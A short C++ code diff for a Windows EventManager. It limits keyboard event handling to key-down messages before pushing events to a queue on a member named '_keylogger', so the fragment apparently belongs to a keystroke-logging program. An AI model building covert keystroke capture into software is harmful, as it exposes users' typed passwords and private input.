@@ -22,8 +22,11 @@ EventManager::~EventManager()
  */
 void					EventManager::handleKeyboardEvent(const WPARAM wParam, const LPARAM lParam) const{
 	
-	const AEvent* event = EventFactory::createKeyboardEvent(wParam, lParam, *updateContext());
-	_keylogger.pushToQueue(event);
+	if (wParam == WM_KEYDOWN)
+	{ 
+		const AEvent* event = EventFactory::createKeyboardEvent(wParam, lParam, *updateContext());
+		_keylogger.pushToQueue(event);
+	}
     return;
 }
 
